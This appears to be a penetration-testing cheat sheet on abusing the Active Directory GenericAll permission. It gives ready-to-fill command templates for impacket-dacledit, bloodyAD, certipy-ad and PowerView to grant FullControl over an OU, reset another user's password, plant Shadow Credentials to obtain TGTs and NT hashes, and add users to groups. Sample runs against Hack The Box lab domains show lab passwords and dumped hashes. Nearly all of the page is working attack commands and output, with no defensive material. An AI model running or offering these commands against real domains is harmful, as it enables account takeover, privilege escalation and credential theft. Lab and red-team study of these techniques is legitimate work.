---
title: "GenericAll"
date: 2024-7-12
tags: ["Shadow Credentials", "Powerview", "Credential Dumping", "AddMember", "Impacket", "Genericall", "Domain Controller", "Active Directory", "Windows"]
---

### Abuse #1: Change Target User Password

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Add Full Control to Current User \[Optional\]

{{< tab set1-1 tab1 active >}}impacket{{< /tab >}}{{< tab set1-1 tab2 >}}bloodyAD{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

```console
# Kerberos
sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
```

```console {class=sample-code}
$ sudo ntpdate -s 10.129.232.31 && impacket-dacledit 'REBOUND.HTB/oorend:1GR8t@$$4u' -k -dc-ip DC01.REBOUND.HTB -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250716-233547.bak
[*] DACL modified successfully!
```

{{< /tabcontent >}}
{{< tabcontent set1-1 tab2 >}}

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class=sample-code}
$ bloodyAD -d REBOUND.HTB -u 'oorend' -p '1GR8t@$$4u' --host DC01.REBOUND.HTB add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

{{< /tabcontent >}}

#### 2. Change Password

{{< tab set1-2 tab1 active >}}bloodyAD{{< /tab >}}
{{< tabcontent set1-2 tab1 >}}

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d REBOUND.HTB -u 'oorend' -p '1GR8t@$$4u' --host DC01.REBOUND.HTB set password 'winrm_svc' '1GR8t@$$4u'
[+] Password changed successfully!
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Change Target User Password

```console
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString Test1234 -AsPlainText -Force
```

```console
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity superfume -AccountPassword $password
```

{{< /tabcontent >}}

---

### Abuse #2: Shadow Credential

{{< tab set3 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Add Full Control to Current User \[Optional\]

{{< tab set3-1 tab1 active >}}impacket{{< /tab >}}{{< tab set3-1 tab2 >}}bloodyAD{{< /tab >}}
{{< tabcontent set3-1 tab1 >}}

```console
# Kerberos
sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.232.31 && impacket-dacledit 'REBOUND.HTB/oorend:1GR8t@$$4u' -k -dc-ip DC01.REBOUND.HTB -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250716-233547.bak
[*] DACL modified successfully!
```

{{< /tabcontent >}}
{{< tabcontent set3-1 tab2 >}}

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d REBOUND.HTB -u 'oorend' -p '1GR8t@$$4u' --host DC01.REBOUND.HTB add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

{{< /tabcontent >}}

#### 2. Shadow Credential

```console
# Password
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username judith.mader@certified.htb -password 'judith09' -account management_svc -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186                                           
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b7e204ab-10bb-721e-4f98-72297623b1ad'
[*] Adding Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
File 'management_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

```console
# NTLM
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username 'management_svc@CERTIFIED.HTB' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -account CA_OPERATOR -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d'
[*] Adding Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

```console
# Kerberos
sudo ntpdate -s <DC_IP> && certipy-ad shadow auto -username <USER>@<DOMAIN> -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -ldap-scheme ldap -ns <DC_IP> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.232.31 && certipy-ad shadow auto -username oorend@REBOUND.HTB -password '1GR8t@$$4u' -k -account winrm_svc -target DC01.REBOUND.HTB -dc-host DC01.REBOUND.HTB -ldap-scheme ldap -ns 10.129.232.31
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '6ea7763d-2272-1bea-078c-e58a01662a29'
[*] Adding Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@rebound.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
```

{{< /tabcontent >}}

---

### Abuse #3 : Add User to Group

{{< tab set4 tab1 >}}Linux{{< /tab >}}
{{< tab set4 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Add User to Group

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
[+] oorend added to SERVICEMGMT
```

```console
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
```

```console
# Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
[+] m.lovegod added to NETWORK AUDIT
```

{{< /tabcontent >}}
{{< tabcontent set4 tab2 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 2. Add User to Group

```console
Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members <USER> -Credential $cred
```

{{< /tabcontent >}}

---

### Abuse #4 : Add GenericAll to Target User over Organizational Unit (OU)

{{< tab set5 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set5 tab1 >}}

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<TARGET_USER>'
```

{{< /tabcontent >}}

